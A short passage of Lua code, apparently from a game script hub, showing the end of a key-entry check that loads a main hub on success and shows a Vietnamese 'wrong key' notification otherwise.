            loadMainHub()
        else
            Notify("❌ KHÔNG CHÍNH XÁC", "Key nhập sai! Hãy nhập:T", 3)
            KeyInput.Text = ""
        end
    end)

end)
 
